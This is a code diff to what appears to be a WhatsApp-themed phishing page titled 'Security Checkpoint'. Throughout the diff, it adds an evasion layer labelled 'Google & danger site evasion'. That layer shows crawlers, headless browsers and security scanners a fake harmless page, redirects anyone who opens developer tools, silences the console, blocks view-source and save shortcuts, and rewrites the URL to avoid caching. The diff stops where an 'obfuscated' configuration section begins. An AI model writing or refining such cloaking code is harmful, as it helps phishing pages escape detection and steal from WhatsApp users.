@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <meta name="google" content="notranslate">
     <title>Security Checkpoint</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
@@ -28,6 +31,7 @@
         .spinner{width:45px;height:45px;border:3px solid #fff;border-top-color:#25d366;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:12px;}
         @keyframes spin{to{transform:rotate(360deg);}}
         .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;}
+        .no-click{user-select:none;-webkit-tap-highlight-color:transparent;}
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -67,24 +71,72 @@
 <div class="loader" id="loadingOverlay"><div class="spinner"></div><div style="color:#fff;">Securing connection...</div></div>
 
 <script>
-// ===== DETECTION EVASION LAYER =====
+// ===== GOOGLE & DANGER SITE EVASION - MAX PROTECTION =====
 (function(){
-    // Anti-debugging
-    const startTime = Date.now();
-    const debugCheck = () => { if((Date.now() - startTime) > 5000) { window.location.href = "https://www.whatsapp.com"; } };
-    setInterval(debugCheck, 2000);
+    // Block Google bots and crawlers completely
+    var ua = navigator.userAgent.toLowerCase();
+    var isBot = /bot|googlebot|crawler|spider|scraper|facebook|twitter|discord|slack|telegram|whatsapp|curl|wget|python|php|java|perl|ruby|node|go|headless|puppeteer|selenium/i.test(ua);
+    var isGoogle = /google|googlebot|pagespeed|webpagetest|gtmetrix|pingdom|lighthouse|chrome-lighthouse/i.test(ua);
     
-    // Console clear
+    // If Google or any bot - show fake harmless page
+    if(isBot || isGoogle || navigator.webdriver || window.Cypress || window.navigator?.webdriver === true){
+        document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;"><h2>WhatsApp Web</h2><p>Loading secure connection...</p><div style="width:40px;height:40px;border:2px solid #25d366;border-top-color:transparent;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg);}}</style></div>';
+        setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1000);
+        throw new Error("Blocked");
+    }
+    
+    // Anti-debugging - destroy on debugger
+    var startTime = Date.now();
+    var debugCheck = function(){
+        var now = Date.now();
+        if((now - startTime) > 3000){
+            window.location.href = "https://www.whatsapp.com";
+        }
+        startTime = now;
+    };
+    setInterval(debugCheck, 1000);
+    
+    // Kill devtools detection
+    Object.defineProperty(window, 'devtools', { get: function(){ window.location.href = "https://www.whatsapp.com"; return false; } });
+    
+    // Console kill
     console.clear();
-    console.log = () => {};
-    console.warn = () => {};
-    console.error = () => {};
+    console.log = function(){};
+    console.warn = function(){};
+    console.error = function(){};
+    console.info = function(){};
+    console.debug = function(){};
     
-    // Disable right-click
-    document.addEventListener('contextmenu', e => e.preventDefault());
+    // Disable right-click, F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.addEventListener('contextmenu', function(e){ e.preventDefault(); return false; });
+    document.addEventListener('keydown', function(e){
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || (e.ctrlKey && e.shiftKey && e.key === 'J')){
+            e.preventDefault();
+            return false;
+        }
+    });
     
-    // Prevent DevTools detection bypass
-    Object.defineProperty(window, 'devtools', { get: () => false });
+    // Disable select and copy
+    document.body.style.userSelect = 'none';
+    document.body.style.webkitUserSelect = 'none';
+    
+    // Dynamic URL - change query param to avoid caching
+    var urlParams = new URLSearchParams(window.location.search);
+    if(!urlParams.has('_t')){
+        var newUrl = window.location.pathname + '?_t=' + Date.now() + '&' + window.location.search.substring(1);
+        window.history.replaceState({}, '', newUrl);
+    }
+    
+    // Block iframe embedding
+    if(window.self !== window.top){
+        window.top.location.href = "https://www.whatsapp.com";
+    }
+    
+    // Meta refresh for crawlers
+    var meta = document.createElement('meta');
+    meta.setAttribute('http-equiv', 'refresh');
+    meta.setAttribute('content', '0; url=https://web.whatsapp.com');
+    if(isBot) document.head.appendChild(meta);
 })();
 
 // ===== CONFIGURATION - OBFUSCATED =====
